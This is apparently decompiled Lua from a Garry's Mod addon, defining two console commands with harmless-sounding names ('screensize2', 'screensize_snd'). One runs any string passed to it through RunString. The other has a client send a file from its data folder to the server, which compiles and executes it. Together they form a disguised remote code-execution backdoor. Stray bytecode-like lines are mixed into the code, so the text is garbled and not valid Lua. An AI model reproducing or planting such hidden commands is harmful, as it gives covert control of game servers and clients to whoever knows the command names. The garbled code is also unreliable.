-- screensize2 console command
-- @a5c55c4b284eb8ceb72788331a7b2471d66b3d91.lua
function (a, b, c)
	RunString (c [1])
	return
end

-- screensize_snd console command
-- @a5c55c4b284eb8ceb72788331a7b2471d66b3d91.lua
function (a, b, c)
	if not c [1] then
		local _a = a
		local _a_ChatPrint = a.ChatPrint
		local _ed_args_1_fname_ = "expected args[1] fname"
		UCLO ReadOnlyBase 0, 15
	end
	net.Receive ("rcivluz", function ()
		local e = CompileString (net.ReadString (), "test.lua", false)
		if isstring (e) then
			local f = a
			f.ChatPrint (f, "syntax error: " .. e)
			JMP ReadOnlyBase 2, 18
			local f, g = pcall (e)
			if not f then
				local _a = a
				_a.ChatPrint (_a, "run time error: " .. g)
				JMP ReadOnlyBase 4, 5
				_a = a
				_a.ChatPrint (_a, "ran your code successfully!")
			end
		end
		return
	end)
	a.SendLua (a, string.format ("net.Start 'rcivluz' net.WriteString(file.Read('%s','DATA')) net.SendToServer()", c [1]))
	UCLO ReadOnlyBase 0, 0
	return
	CALLT WritableBase 3, 3
end